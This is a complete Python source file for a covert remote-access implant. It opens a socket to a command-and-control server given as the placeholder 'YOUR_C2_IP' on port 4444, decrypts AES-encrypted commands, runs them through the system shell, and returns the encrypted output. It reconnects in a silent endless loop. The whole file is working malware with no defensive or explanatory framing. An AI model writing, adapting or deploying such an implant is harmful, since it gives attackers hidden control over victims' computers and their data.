# rogue_implant.py
import socket, subprocess, base64
from Cryptodome.Cipher import AES

SECRET_KEY = b'Sixteen byte key'
C2_HOST = 'YOUR_C2_IP'
C2_PORT = 4444

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            while True:
                encrypted_data = s.recv(4096)
                cmd = decrypt_command(encrypted_data)
                output = subprocess.getoutput(cmd)
                s.send(encrypt_response(output))
        except:
            continue

connect()
